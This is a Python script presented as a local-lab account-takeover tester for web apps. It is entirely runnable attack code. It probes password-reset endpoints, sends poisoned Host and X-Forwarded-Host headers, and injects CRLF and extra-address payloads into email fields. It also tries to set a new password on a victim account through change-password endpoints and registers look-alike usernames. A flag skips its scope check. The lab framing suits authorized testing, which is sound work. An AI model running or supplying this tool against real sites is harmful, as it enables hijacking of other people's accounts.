#!/usr/bin/env python3
"""
ato_test.py — Account Takeover local lab tester

LEGAL NOTICE
------------
This tool is intended for use in authorized security testing and educational
lab environments ONLY. You must have explicit written permission from the
system owner before running any tests. Unauthorized use against systems you
do not own or lack permission to test is illegal and may result in criminal
prosecution under the CFAA, UK Computer Misuse Act, and equivalent laws.

By running this script you confirm that you are operating within your
authorized scope.

Usage:
    python3 ato_test.py --target http://127.0.0.1 --email victim@lab.local
    python3 ato_test.py --target http://127.0.0.1 --email victim@lab.local --attacker attacker@lab.local
    python3 ato_test.py --help
"""

import argparse
import sys
import urllib.parse
import requests

# Suppress InsecureRequestWarning for local self-signed certs
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

RESET_PATHS = [
    "/reset",
    "/reset-password",
    "/forgot-password",
    "/api/password/reset",
    "/api/v1/password/reset",
    "/account/reset",
    "/user/password/reset",
]

CHANGE_PASS_PATHS = [
    "/api/changepass",
    "/api/v1/changepass",
    "/account/password",
    "/user/password",
]


def banner():
    print("=" * 60)
    print("  Account Takeover — Local Lab Tester")
    print("  Target scope: LOCAL / AUTHORIZED ONLY")
    print("=" * 60)
    print()


def confirm_scope(target: str) -> bool:
    """Refuse to run against obviously non-local targets unless confirmed."""
    parsed = urllib.parse.urlparse(target)
    host = parsed.hostname or ""
    local_hosts = {"127.0.0.1", "localhost", "::1"}
    if host in local_hosts or host.startswith("192.168.") or host.startswith("10."):
        return True
    print(f"[!] WARNING: Target '{target}' does not appear to be a local address.")
    answer = input("    Have you obtained written authorization to test this host? [yes/NO]: ").strip().lower()
    return answer == "yes"


def make_session(verify_ssl: bool = False) -> requests.Session:
    s = requests.Session()
    s.verify = verify_ssl
    s.headers.update({"User-Agent": "ATO-LabTester/1.0"})
    return s


# ---------------------------------------------------------------------------
# Test 1 — Password Reset Token Leak via Referrer
# ---------------------------------------------------------------------------
def test_referrer_leak(session: requests.Session, target: str, email: str):
    print("[*] Test 1: Password Reset Token Leak via Referrer")
    for path in RESET_PATHS:
        url = target.rstrip("/") + path
        try:
            r = session.post(url, data={"email": email}, timeout=5)
            if "token" in r.text.lower() or "resetToken" in r.text:
                print(f"    [+] Potential token leak in response body at {url}")
                print(f"        Response snippet: {r.text[:200]}")
            else:
                print(f"    [-] No obvious token leak at {url} (status {r.status_code})")
        except requests.exceptions.ConnectionError:
            print(f"    [~] No connection to {url}")
    print()


# ---------------------------------------------------------------------------
# Test 2 — Host Header Poisoning
# ---------------------------------------------------------------------------
def test_host_header_poison(session: requests.Session, target: str, email: str, attacker: str):
    print("[*] Test 2: Password Reset Host Header Poisoning")
    poison_headers = [
        {"Host": attacker},
        {"X-Forwarded-Host": attacker},
        {"X-Host": attacker},
        {"X-Forwarded-Server": attacker},
    ]
    for path in RESET_PATHS:
        url = target.rstrip("/") + path
        for headers in poison_headers:
            header_name = list(headers.keys())[0]
            try:
                r = session.post(url, data={"email": email}, headers=headers, timeout=5)
                if attacker in r.text:
                    print(f"    [+] Attacker host reflected in response via {header_name} at {url}")
                else:
                    print(f"    [-] No reflection via {header_name} at {url} (status {r.status_code})")
            except requests.exceptions.ConnectionError:
                print(f"    [~] No connection to {url}")
    print()


# ---------------------------------------------------------------------------
# Test 3 — Email Parameter Pollution
# ---------------------------------------------------------------------------
def test_email_pollution(session: requests.Session, target: str, victim: str, attacker: str):
    print("[*] Test 3: Password Reset Email Parameter Pollution")
    payloads = [
        # query string pollution
        f"email={victim}&email={attacker}",
        # carbon copy
        f"email={urllib.parse.quote(victim + chr(10) + chr(13) + 'cc:' + attacker)}",
        # pipe separator
        f"email={victim}|{attacker}",
        # comma separator
        f"email={victim},{attacker}",
    ]
    for path in RESET_PATHS:
        url = target.rstrip("/") + path
        for payload in payloads:
            try:
                r = session.post(
                    url,
                    data=payload,
                    headers={"Content-Type": "application/x-www-form-urlencoded"},
                    timeout=5,
                )
                print(f"    [~] {url} | payload={payload[:60]!r} -> status {r.status_code}")
            except requests.exceptions.ConnectionError:
                print(f"    [~] No connection to {url}")
    print()


# ---------------------------------------------------------------------------
# Test 4 — IDOR on Change Password Endpoint
# ---------------------------------------------------------------------------
def test_idor_change_pass(session: requests.Session, target: str, victim: str):
    print("[*] Test 4: IDOR on Change Password API")
    for path in CHANGE_PASS_PATHS:
        url = target.rstrip("/") + path
        try:
            r = session.post(
                url,
                json={"email": victim, "password": "NewLabPassword1!"},
                timeout=5,
            )
            if r.status_code in (200, 201):
                print(f"    [+] Endpoint accepted request for {victim} at {url} — verify if change was applied!")
            else:
                print(f"    [-] {url} returned {r.status_code}")
        except requests.exceptions.ConnectionError:
            print(f"    [~] No connection to {url}")
    print()


# ---------------------------------------------------------------------------
# Test 5 — Username Collision (whitespace padding)
# ---------------------------------------------------------------------------
def test_username_collision(session: requests.Session, target: str, victim_user: str):
    print("[*] Test 5: Username Collision via Whitespace Padding")
    padded = f"{victim_user} "
    register_paths = ["/register", "/signup", "/api/register", "/api/v1/register"]
    for path in register_paths:
        url = target.rstrip("/") + path
        try:
            r = session.post(
                url,
                json={"username": padded, "email": "attacker_collision@lab.local", "password": "LabPass1!"},
                timeout=5,
            )
            print(f"    [~] {url} -> status {r.status_code} | username={padded!r}")
        except requests.exceptions.ConnectionError:
            print(f"    [~] No connection to {url}")
    print()


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------
def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        description="Account Takeover — local lab tester. Authorized use only.",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    parser.add_argument("--target", default="http://127.0.0.1", help="Base URL of the target (default: http://127.0.0.1)")
    parser.add_argument("--email", default="victim@lab.local", help="Victim email address to test against")
    parser.add_argument("--attacker", default="attacker@lab.local", help="Attacker-controlled email/domain")
    parser.add_argument("--username", default="admin", help="Victim username for collision test")
    parser.add_argument("--skip-confirm", action="store_true", help="Skip scope confirmation prompt (use only in automated lab pipelines)")
    return parser.parse_args()


def main():
    banner()
    args = parse_args()

    if not args.skip_confirm and not confirm_scope(args.target):
        print("[!] Scope not confirmed. Exiting.")
        sys.exit(1)

    print(f"[*] Target : {args.target}")
    print(f"[*] Victim email  : {args.email}")
    print(f"[*] Attacker email: {args.attacker}")
    print()

    session = make_session()

    test_referrer_leak(session, args.target, args.email)
    test_host_header_poison(session, args.target, args.email, args.attacker)
    test_email_pollution(session, args.target, args.email, args.attacker)
    test_idor_change_pass(session, args.target, args.email)
    test_username_collision(session, args.target, args.username)

    print("[*] Done. Review findings manually — automated results are indicators only.")


if __name__ == "__main__":
    main()
